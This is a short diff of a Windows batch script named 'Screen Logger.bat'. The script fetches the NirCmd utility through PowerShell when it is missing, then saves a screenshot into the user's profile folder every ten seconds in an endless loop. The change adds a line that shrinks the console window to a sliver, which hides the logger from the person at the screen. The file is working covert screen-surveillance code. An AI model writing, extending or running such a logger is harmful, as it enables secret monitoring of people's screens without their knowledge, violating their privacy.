@@ -1,6 +1,7 @@
 @echo off
 title Screen Logger.bat
 color 0c
+mode con cols=15 lines=1
 goto :IFs
 :IFs
 if exist %userprofile%\nircmd-x64 (goto :screenshots)
@@ -12,7 +13,7 @@ if not exist %userprofile%\nircmd-x64.zip (cmd /k "powershell.exe -command Invok
 goto :screenshots
 :screenshots
 set screenshots=%userprofile%\nircmd-x64\screenshots
-if exist %userprofile%\nircmd-x64\screenshots (
+if exist %screenshots% (
 cd %userprofile%\nircmd-x64 & nircmd.exe savescreenshot %screenshots%\%random%.png & timeout /t 10 > nul & goto :screenshots) else (
 if not exist %userprofile%\nircmd-x64\screenshots (mkdir %screenshots% & goto :screenshots)
 )
